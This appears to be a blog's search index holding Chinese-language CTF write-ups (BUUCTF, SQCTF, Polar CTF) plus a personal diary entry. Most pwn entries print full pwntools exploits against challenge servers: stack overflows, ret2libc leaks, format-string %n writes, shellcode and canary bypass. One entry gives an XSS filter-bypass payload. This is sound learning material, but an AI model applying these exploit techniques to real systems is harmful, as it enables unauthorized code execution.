<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BUUCTF-PWN</title>
      <link href="/2025/05/24/BUUCTF-PWN/"/>
      <url>/2025/05/24/BUUCTF-PWN/</url>
      
        <content type="html"><![CDATA[<p>记录写BUUCTF的过程</p><h1 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h1><p>一道简单的题目，直接nc连接并ls看有哪些文件，最后cat获得flag。（从给的二进制文件也可以看出，程序运行直接执行system(‘&#x2F;bin&#x2F;sh’)，获取shell）</p><h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><p>本题是一道64位的elf，并没有开启什么保护</p><p><img src="/images/rip1.png"></p><p><img src="/images/rip2.png"></p><p>在IDA中发现存在明显的栈溢出以及后门函数，因此这就是一道简单的栈溢出，通过gets函数溢出修改返回地址到后面函数即可。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">ret=<span class="number">0x401016</span></span><br><span class="line">io=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29603</span>)</span><br><span class="line"></span><br><span class="line">payload=cyclic(<span class="number">0xF</span>+<span class="number">8</span>)+p64(ret)+p64(<span class="number">0x401186</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p>本题是一道64位的elf，并没有开启什么保护</p><p><img src="/images/warmup_csaw_2016_1"></p><p><img src="/images/warmup_csaw_2016_2"></p><p>放入IDA中发现，会输出一个含有system(‘cat flag.txt’)的函数地址，并且在main函数最后会调用gets函数，因此存在明显的栈溢出。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26192</span>)</span><br><span class="line"></span><br><span class="line">payload=cyclic(<span class="number">0x40</span>+<span class="number">8</span>)+p64(<span class="number">0x4004a1</span>)+p64(<span class="number">0x40060D</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><p>本题是一道64位的题目，只开启了NX保护</p><p><img src="/images/ciscn_2019_n_1"></p><p>通过IDA可以发现，先输入赋值给v1，接着判断v2的值，如果v2&#x3D;11.28125，则执行system(“cat &#x2F;flag”)。</p><p>因此有两站思路：1、算出v1至v2的距离，将v2的值覆盖为11.28125即可。2、直接理由gets函数进行栈溢出，并将返回地址改为system(“cat &#x2F;flag”)即可。</p><p>方法1：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=remote(&#x27;node5.buuoj.cn&#x27;,28254)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;A&#x27;*(0x30-0x4) + p64(0x41348000)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>方法2：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io=remote(&#x27;node5.buuoj.cn&#x27;,28254)</span><br><span class="line"></span><br><span class="line">payload=cyclic(0x30+8)+p64(0x4006BE)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><p>本题是一位32的题目，且只开启了NX保护</p><p><img src="/images/pwn1_sctf_2016_1"></p><p><img src="/images/pwn1_sctf_2016_2"></p><p>通过在IDA中发现，是一个c++编写的程序，应该是静态编译的，分析程序代码发现，其会将I变为you，会增加两个字节，从而就会造成栈溢出，将返回地址改为后门函数即可。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26466</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn1_sctf_2016&quot;</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">&quot;get_flag&quot;</span>]</span><br><span class="line"><span class="comment">#system_addr = 0x08048F13</span></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">21</span>+<span class="string">b&#x27;a&#x27;</span>+p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><p>简单的64位ret2text，且存在后门函数，直接上exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29956</span>)</span><br><span class="line"></span><br><span class="line">payload=cyclic(<span class="number">0x80</span>+<span class="number">8</span>)+p64(<span class="number">0x400431</span>)+p64(<span class="number">0x400596</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><p>这是一道32位的题目，开启了Canary保护以及NX保护</p><p><img src="/images/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9B--PWN5_1.png"></p><p>在IDA中发现，该程序不存在栈溢出，但已经给出了后门函数，只需要进行判断即可，本题的逻辑为：从&#x2F;dev&#x2F;urandom文件中读取一个随机数放到0x804c044地址处的变量中，然后用户输入用户名和密码，如果密码和变量相同则能够提权。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">read(fd, &amp;buf_, 4u);</span><br><span class="line">  printf(&quot;your name:&quot;);</span><br><span class="line">  read(0, buf, 0x63u);</span><br><span class="line">  printf(&quot;Hello,&quot;);</span><br><span class="line">  printf(buf);</span><br><span class="line">  printf(&quot;your passwd:&quot;);</span><br><span class="line">  read(0, nptr, 0xFu);</span><br><span class="line">  if ( atoi(nptr) == buf_ )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;ok!!&quot;);</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在这里存在一个格式化字符串漏洞，可以利用这个漏洞使用%n修改buf_的值，因此首先需要找到输入的参数在栈上的偏移量是多少，这里可以用<strong>fmtarg</strong>这个插件直接找到偏移</p><p><img src="/images/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9B--PWN5_2.png"></p><p>通过read(fd, &amp;buf_, 4u)可知长度为4个字节，因此可以用%10$，%11$，%12$，%13$来定位地址，再用%n修改内容就可以了。</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line">#io=process(&#x27;./第五空间2019决赛--PWN5&#x27;)</span><br><span class="line">io=remote(&#x27;node5.buuoj.cn&#x27;,28693)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line"></span><br><span class="line">payload = p32(0x804c047)+p32(0x804c046)+p32(0x804c045)+p32(0x804c044)+b&#x27;%10$hhn%11$hhn%12$hhn%13$hhn&#x27;</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.sendline(str(0x10101010))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p>是一道简单的32位的题目</p><p><img src="/images/jarvisoj_level2_1.png"></p><p>在IDA中发现关键函数，存在栈溢出，本程序给出了system函数以及&#x2F;bin&#x2F;sh字符串，但是并没有在一起，因此就将&#x2F;bin&#x2F;sh作为参数传入system函数即可。32位是后传参，而64位是先传参。</p><p><img src="/images/jarvisoj_level2_2.png"></p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">elf=ELF(&#x27;./level2&#x27;)</span><br><span class="line">io=remote(&#x27;node5.buuoj.cn&#x27;,25264)</span><br><span class="line"></span><br><span class="line">system=elf.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh=0x0804A024</span><br><span class="line"></span><br><span class="line">payload=cyclic(0x88+4)+p32(system)+p32(0)+p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025日常琐事</title>
      <link href="/2025/05/21/2025%E6%97%A5%E5%B8%B8%E7%90%90%E4%BA%8B/"/>
      <url>/2025/05/21/2025%E6%97%A5%E5%B8%B8%E7%90%90%E4%BA%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>好久没更新了，之前一大堆有的没的的事，还是挺烦的。刚好这几天快弄完了，想着回来继续更新完善自己的博客，毕竟也是当年自己弄了好久辛辛苦苦搭建好的。最近自己萌发了一个念想——加入星盟，因为听包学长（就是那大名鼎鼎的baozongwi）说星盟的pwn挺强的，于是我打算先提升自己的实力，然后去投简历试试（想着在我生日前能够完成这项目标，也是作为我给自己的生日礼物吧），如果进了的话就好好磨练自己的pwn技术，不行的话就继续努力。</p><p><img src="/images/daily1.png"></p><p><img src="/images/daily2.png"></p><p>看着好多师傅都有记录日常的习惯，于是我也想着来弄一个，顺便还可以加上自己的一下计划，以此来督促自己吧，我觉得这挺好的。以前的话太懒散了，没有什么目标与规划，就只想着打XCTF（也只是想着），但是自己呢又不知道在干什么，感觉每天都在混，混着混着也快大二了，每次看比赛群里面那些比我小还比我厉害的师傅们，还是感慨万千。想着当年包学长给我说的，不能只是想着，得有行动。再看看我身边的学习氛围（感觉一言难尽，不说应该也能想到），哎，如果再这么混下去，自己和他们也快差不多了。</p><p>于是乎，我决定就趁着这次我想进星盟的念想来改变一下，不能再这么混下去了。就通过写博客并在博客里加上计划来不断督促自己，之前的我就是没有计划、太懒散、太拖延、太急于求成了，才导致如今的结果，是得改变一下自己的学习方式了。</p><p>最后，希望我能在大学期间完成自己当年顶下的目标——站在CTF总决赛的舞台上捧杯。</p><h1 id="六月"><a href="#六月" class="headerlink" title="六月"></a>六月</h1>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025SQCTF</title>
      <link href="/2025/04/12/SQCTF/"/>
      <url>/2025/04/12/SQCTF/</url>
      
        <content type="html"><![CDATA[<p>很荣幸参加了第四届SQCTF，作为新生赛，难度还可以，因为本人能力还不够，并没能够akpwn，还得再努力努力（毕竟是想打XCTF的，这点实力是肯定不行的。</p><h1 id="浅红欺醉粉，肯信有江梅"><a href="#浅红欺醉粉，肯信有江梅" class="headerlink" title="浅红欺醉粉，肯信有江梅"></a>浅红欺醉粉，肯信有江梅</h1><p>一道简单到不能再简单的nc签到题。</p><h1 id="领取你的小猫娘"><a href="#领取你的小猫娘" class="headerlink" title="领取你的小猫娘"></a>领取你的小猫娘</h1><p>这是一道64位的题，基本没开什么保护。</p><p><img src="/images/cat.png"><img src="/images/cat.backdoor"></p><p>这里可以看到有一个后门函数，其判断条件为v5的值为真，因为我们能输入的是v4，而且观察栈上结构可以知道地址相差0x50-4。所以可以通过输入覆盖到v5并将v5的值变为真即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line">io=remote(&#x27;challenge.qsnctf.com&#x27;,31547)</span><br><span class="line"></span><br><span class="line">payload=cyclic(0x50-4)+p64(1)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="江南无所有，聊赠一枝春"><a href="#江南无所有，聊赠一枝春" class="headerlink" title="江南无所有，聊赠一枝春"></a>江南无所有，聊赠一枝春</h1><p>这是一道64位的题，开启了NX保护，因此不好使用shellcode。</p><p><img src="/images/gift"><img src="/images/gift.1"></p><p>通过IDA可以发现存在明显栈溢出，并且有后门函数，所以这题是一道简单的ret2text，通过栈溢出覆盖返回地址为后门函数。（注意堆栈平衡。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io=remote(&#x27;challenge.qsnctf.com&#x27;,32767)</span><br><span class="line">elf=ELF(&#x27;./gift&#x27;)</span><br><span class="line">backdoor=elf.sym[&#x27;gift&#x27;]</span><br><span class="line">payload=cyclic(64+8)+p64(0x40101a)+p64(0x4011B6)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="当时只道是寻常"><a href="#当时只道是寻常" class="headerlink" title="当时只道是寻常"></a>当时只道是寻常</h1><p>这是一道64位的题目，基本没开什么保护。</p><p><img src="/images/pwn01">并且有&#x2F;bin&#x2F;sh的地址，但是没有system函数，所以我第一反应应该是64位的ret2syscall。</p><p>32位与64位syscall的相同点是都必须调用寄存器，都想构造出execve(&#x2F;bin&#x2F;sh,0,0)这种结构。</p><p>两者最主要的区别是系统调用号、传参以及最后的中断命令不一样，但是大致思路都是一样的，在这就不多说了。（主要是找不到当时写的exp了，又懒得再写一遍。</p><h1 id="被酒莫惊春睡重"><a href="#被酒莫惊春睡重" class="headerlink" title="被酒莫惊春睡重"></a>被酒莫惊春睡重</h1><p>这也是一道简单的64位题目。</p><p>我感觉是一道简单的ret2libc的题目，只需要满足一些特定的条件就能进入溢出函数了，然后就是普通的libc了，在此也不想做过多的介绍了。</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Polar-Ctf2025春季赛复现</title>
      <link href="/2025/03/23/Polar-Ctf%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/03/23/Polar-Ctf%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="可老师签到"><a href="#可老师签到" class="headerlink" title="可老师签到"></a>可老师签到</h2><p>这是一道比较有意思的签到题，难点在于如何理解它给的提示。</p><p><img src="/images/%E5%8F%AF%E8%80%81%E5%B8%88%E7%AD%BE%E5%88%B01.png"></p><p><img src="/images/%E5%8F%AF%E8%80%81%E5%B8%88%E7%AD%BE%E5%88%B02.png"></p><p>本题是一个游戏题，最后会让我们关注公众号，发送两次flag（<strong>这是关键，并非是最后提交时让flag*2</strong>），获得正确的flag。</p><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>这依旧是一道比较有趣的杂项题，主办方给了我们一个flag.xlsx工作表。</p><p><img src="/images/find1.png"></p><p>发现全是空白，然后也没有任何与flag相关的东西，于是，我猜测其可能是被隐藏了，仔细观察发现有些表格使用的是粗体，有些什么都没有，因此就证实了我的猜测，其可能是全部被弄成白色了，于是我打算将其变为黑色。</p><p><img src="/images/find3.png"></p><p>替换后进行对行高的调整发现是一个二维码，最后使用工具扫码获得flag。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="来个弹窗"><a href="#来个弹窗" class="headerlink" title="来个弹窗"></a>来个弹窗</h2><p>打开所给网址可以看到这是一道XSS漏洞题目，首先输入一个基础的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>，发现返回空，因此我们进行双写绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;scscriptript&gt;alert(1)&lt;/scscriptript&gt;</span><br></pre></td></tr></table></figure><p>发现可以，获得一张图片，提示是flag就是该人物名称md5加密。</p><h2 id="0e事件"><a href="#0e事件" class="headerlink" title="0e事件"></a>0e事件</h2><p>打开网站可以看到一个提示：请通过 URL 参数 ‘a’ 提交你的输入。由于题目为0e事件，由此可以猜测此题可以通过0e绕过，最后发现可以，获得flag。</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="knock-knock"><a href="#knock-knock" class="headerlink" title="knock knock"></a>knock knock</h2><p><img src="/images/knock.png"></p><p>从题目我们可以知道这道题考查的是敲击码，于是我们通过搜索并进行解码可以将密文变成THIS IS YOUR CHAMPION接着进行32位小写MD5加密即可。</p><h2 id="LGC"><a href="#LGC" class="headerlink" title="LGC"></a>LGC</h2><p>通过题目我们可以看出是LGC，因此我们需要了解什么是LGC，接着再编写脚本即可。</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="koi"><a href="#koi" class="headerlink" title="koi"></a>koi</h2><p>经过file我们可以知道是一个64位文件，然后checksec发现它开启了一个NX保护，放进IDA看看。</p><p><img src="/images/koi1.png"></p><p>发现主函数中有4个子函数，依次点进发现wrshell()函数与xxx()函数存在栈溢出。</p><p><img src="/images/koi2.png"></p><p><img src="/images/koi3.png"></p><p>再通过主函数我们可以分析出，需要当V4&#x3D;&#x3D;520且n&#x3D;&#x3D;520时，才会调用xxx()函数，因此需要修改n的值。这里我想的是栈迁移，进入wrshell函数，通过read进行溢出将rbp的地址覆盖成n的地址，将n的值改成520，接着就可以进入xxx()函数，再通过puts泄漏libc，最后再read进行栈溢出将返回地址覆盖，获取shell（需注意的是调用了scanf函数，会造成偏移，因此我们需要将偏移抵消）。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io=remote(&#x27;1.95.36.136&#x27;,2115)</span><br><span class="line">context(arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line">elf=ELF(&#x27;./koi&#x27;)</span><br><span class="line">libc=ELF(&#x27;libc6_2.23-0ubuntu11.3_amd64.so&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">payload1=cyclic(0x50)+p64(0x060108C+0x4)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(b&#x27;520&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">xxx_addr=elf.sym[&#x27;xxx&#x27;]</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">rdi_ret=0x0400a63</span><br><span class="line">payload2=cyclic(0x50+8)+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(xxx_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">puts_addr=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print (hex(puts_addr))</span><br><span class="line">libc_base=puts_addr-libc.sym[&#x27;puts&#x27;]</span><br><span class="line">print (hex(libc_base))</span><br><span class="line">system=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line">print (hex(system))</span><br><span class="line">bin_sh=libc_base+next(libc.search(&#x27;/bin/sh&#x27;))</span><br><span class="line">print (hex(bin_sh))</span><br><span class="line">payload3=cyclic(0x50+8)+p64(rdi_ret)+p64(bin_sh)+p64(system)</span><br><span class="line">io.sendline(payload3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>当然我们泄漏了puts的地址后，需要找到相应的libc版本，可以到<a href="https://libc.blukat.me/">libc database search</a>这里去寻找。（有可能我写的比较复杂，主要是看获得的地址）</p><h2 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h2><p>本题是一道简单的32位libc。通过checksec，发现开启了NX保护。</p><p><img src="/images/libc1.png"></p><p>通过IDA我们可以发现主函数中有两个子函数，分别进入看一下，</p><p><img src="/images/libc2.png"></p><p><img src="/images/libc3.png"></p><p>在jiu()函数中我们可以发现存在明显的栈溢出，由于并未告知system函数与&#x2F;bin&#x2F;sh的地址，但存在puts，于是我们可以通过puts泄漏libc，从而编写脚本获得shell，得到flag。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io=remote(&#x27;1.95.36.136&#x27;,2101)</span><br><span class="line">elf=ELF(&#x27;./libc&#x27;)</span><br><span class="line">libc=(&#x27;./libc6-i386_2.23-0ubuntu11.3_amd64.so&#x27;)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">jiu=elf.sym[&#x27;jiu&#x27;]</span><br><span class="line"></span><br><span class="line">payload1=cyclic(0x3A+4)+p32(puts_plt)+p32(jiu)+p32(puts_got)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">puts_addr=u32(io.recvuntil(&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">print (hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-0x05f150</span><br><span class="line">system=libc_base+0x03a950</span><br><span class="line">bin_sh=libc_base+0x15912b</span><br><span class="line">payload2=cyclic(0x3A+4)+p32(system)+p32(0)+p32(bin_sh)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="bllbl-shellcode-2"><a href="#bllbl-shellcode-2" class="headerlink" title="bllbl_shellcode_2"></a>bllbl_shellcode_2</h2><p>通过file与checksec，我们可以知道本题是一道64位的且没有开启NX保护的shellcode，将其拖入IDA中看看。</p><p><img src="/images/shellcode1.png"></p><p><img src="/images/shellcode2.png"></p><p>我们可以发现有一个yichu函数，进去一看，先是打印出v2的地址，然后读取用户输入的数据到v2，有可以在侧边栏看到reg函数，发现里面是汇编指令。因此大致思路就是先构造shellcode并写入到v2与rbp所占的栈空间，接着再让栈顶指针rsp重新指向一开始的地址，从而执行shellcode。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">io = remote(&#x27;1.95.36.136&#x27;,2123)</span><br><span class="line">elf = ELF(&#x27;./shellcode2&#x27;)</span><br><span class="line">io.recvuntil(b&quot;0x&quot;)</span><br><span class="line">v2 = int(io.recv(12),16)</span><br><span class="line">success(&quot;v2 &gt;&gt;&gt; 0x%x&quot; % v2)</span><br><span class="line">io.recv()</span><br><span class="line">jmp_rsp = 0x0000401380</span><br><span class="line">binsh = 0x00000402047</span><br><span class="line">shellcode = asm(&quot;&quot;&quot;</span><br><span class="line">    mov al, 0x3b</span><br><span class="line">    mov esi, edi</span><br><span class="line">    mov edi, 0x402047;</span><br><span class="line">    mov edx, esi</span><br><span class="line">    syscall</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line">shellcode += p64(jmp_rsp)</span><br><span class="line">shellcode += asm(&quot;sub rsp,0x15;jmp rsp&quot;)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="fmt-text"><a href="#fmt-text" class="headerlink" title="fmt_text"></a>fmt_text</h2><p>还是老样子，是32位开启NX保护与Canary保护的elf。根据题目我猜测是通过格式化字符串漏洞绕过Canary保护。放进IDA。</p><p><img src="/images/fmt_text1.png"></p><p>在这直接进入yichu函数，发现和我的猜想一模一样，存在格式化字符串漏洞，接着再Shift+F12发现存在system函数但是没有&#x2F;bin&#x2F;sh<img src="/images/fmt_text2.png">，然后再看看bss段上有没有什么东西，发现有个buf<img src="/images/fmt_text3.png">。</p><p>欧克，思路清晰了，我们可以通过格式化字符串漏洞绕过Canary保护，接着将&#x2F;bin&#x2F;sh写入buf中，最后通过栈溢出，调用system函数，把buf当作其参数，从而获取shell。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io = remote(&#x27;1.95.36.136&#x27;,2141)</span><br><span class="line">gets_addr =  0x08048430</span><br><span class="line">system_addr = 0x8048460</span><br><span class="line">buf_addr = 0x0804A080</span><br><span class="line">io.sendline(b&quot;%31$p&quot;)</span><br><span class="line">canary=int(io.recv(),16)</span><br><span class="line">print(&quot;camary&gt;&gt;&gt;&quot;,hex(canary))</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*25*4+p32(canary)+b&#x27;a&#x27;*3*4+p32(gets_addr)+p32(system_addr)+p32(buf_addr)+p32(buf_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(&#x27;sh&#x27;)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>欧克，本次的polarctf2025春季赛就复现这么多了，因为有些东西还没学到那里，复现难度大，以后未复现的题目会出现在Polar-xxx-wp里面。</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Polar-pwn-wp</title>
      <link href="/2025/03/18/Polar-pwn-wp/"/>
      <url>/2025/03/18/Polar-pwn-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h1><p><img src="/images/sandbox-checksec.png"></p><p>先将文件拖入kali中检查一下，发现是一个六十四位的elf，开启了NX保护以及Canary。</p><p><img src="/images/sandbox-ida1.png"></p><p><img src="/images/sandbox-ida2.png"></p><p>将该文件拖入IDA中发现有一个box函数，点击进入box函数，我们发现定义了一个字符buf，是用户输入的，但是其用if对字符buf进行判断，进而过滤了一些关键字，若我们输入相应的关键字，该程序就会直接结束。</p><p><img src="/images/sandbox-nc.png"></p><p>我们再进行nc连接发现里面有flag，但是由于其过滤了cat、flag两个关键字，因此我们需要进行绕过，从而获取flag。</p><p>还有一种方法就是，因为若我们不输入关键字，在box函数最后会执行system函数，由于无法输入&#x2F;bin&#x2F;sh与sh进行提权，那么我们可以利用system(‘$0’)来提权，因此exp可以如下编写：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">#r=remote(&#x27;ip&#x27;,port)</span><br><span class="line">r=process(&#x27;./sandbox&#x27;)</span><br><span class="line">payload=&#x27;$0&#x27;</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="creeper"><a href="#creeper" class="headerlink" title="creeper"></a>creeper</h1><p><img src="/images/creeper-checksec.png"></p><p>同样先拖进kali观察一下，64位elf，没有什么保护。</p><p><img src="/images/creeper-ida1.png"></p><p><img src="/images/creeper-ida2.png"></p><p>将其拖入IDA中观察，发现有一个game函数，点击进入，同样是定义了一个字符buf，由我们输入，并且发现system函数，但是对输入的字符长度限制为15，因此我们只需要输入的字符的长度为15就行了。（注意：如果是nc连接，最后的回车也算是一个字符；如果是用sendline上传payload，最后也有一个回车；如果是send，最后就没有回车。</p><p>中间几道太简单了，在这里就没进行记录，记录一下有意义的题。</p><h1 id="name4"><a href="#name4" class="headerlink" title="name4"></a>name4</h1><p>步骤与前面几道题差不多，就不再赘述了。在这里只做分析。</p><p>经过检查可以发现没有开启任何保护，并且没有相关的后门函数，因此可以用shellcode来获权。</p><p><img src="/images/name4-ida1.png"></p><p><img src="/images/name4-ida2.png"></p><p>通过ida我们可以发现一个start函数，跟进发现存在栈溢出，而且name与::s均在bss段上，因此我们可以将shellcode写入二者之一，但是由于name是用来判断是否为0，只有其为0才会调用gets函数进行栈溢出，所以我们用“\x00”来进行绕过并将shellcode写入s中，最后再进行栈溢出，返回地址为s。下面为exp：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io=remote(&#x27;IP&#x27;,port)</span><br><span class="line">io.sendlineafter(b&#x27;name:\n&#x27;,b&#x27;\x00&#x27;)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">io.sendlineafter(b&#x27;name:\n&#x27;,shellcode)</span><br><span class="line">payload=b&#x27;a&#x27;*(0x20+4)+p32(0x0804A0E0)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
